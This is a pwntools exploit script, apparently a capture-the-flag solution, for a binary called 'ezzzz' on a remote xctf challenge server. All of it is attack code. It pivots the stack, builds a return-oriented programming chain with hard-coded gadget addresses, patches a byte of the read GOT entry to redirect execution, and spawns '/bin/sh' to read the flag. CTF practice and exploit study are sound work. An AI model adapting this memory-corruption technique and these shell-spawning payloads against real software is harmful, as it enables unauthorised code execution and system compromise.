#!/usr/bin/python3
# -*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

# context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

LOCAL = 0
filename = "./ezzzz"
if LOCAL:
    io = process(filename)
else:
    io = remote("pwn-51aec3a80a.challenge.xctf.org.cn", 9999, ssl=True)
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s: log.info("\033[1;31;40m %s --> 0x%x \033[0m" % (s, eval(s)))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass


debugPID()
pop_rdi_ret = 0x00000000004007E3
pop_rsir15_ret = 0x00000000004007E1
leave_ret = 0x0000000000400712
ret = pop_rdi_ret + 1
pop_rbp_ret = 0x0000000000400570
magic_gadget = 0x0000000000400672  # mov rax, qword ptr [rbp - 8] ; mov qword ptr [rdx], rax ; nop ; pop rbp ; ret

stdin_address = elf.sym["stdin"]

read_address = elf.plt["read"]
main_address = 0x400740
got_read = elf.got["read"]

# 栈迁移
payload = b"a" * 0x10 + p64(0x601000 + 0x760)
payload += flat(
    [
        pop_rsir15_ret,
        0x601760,
        0,
        read_address,
        leave_ret,
    ]
)
s(payload)

input()
payload = flat(
    [
        0x601760,
        pop_rsir15_ret,
        0x601018,
        0,
        read_address,
        pop_rdi_ret,
        0,
        pop_rsir15_ret,
        1,
        0,
        0x400606,
        pop_rsir15_ret,
        0x601828,
        0,
        read_address,
        pop_rsir15_ret,
        0x601000 + 0xF00,
        0,
        read_address,
        pop_rdi_ret,
        0x601000 + 0xF00,
        pop_rsir15_ret,
        0,
        0,
        ret,
    ]
)
s(payload)

input()
payload = flat(
    [
        0,
        0,
        0,
        0,
        0,
        got_read,
    ]
)
s(payload)

input()
payload = p8(0x90)
s(payload)

input()
payload = b"/bin/sh\x00".ljust(0x3B, b"a")
s(payload)

input()
sl(b"cat flag*")

ia()
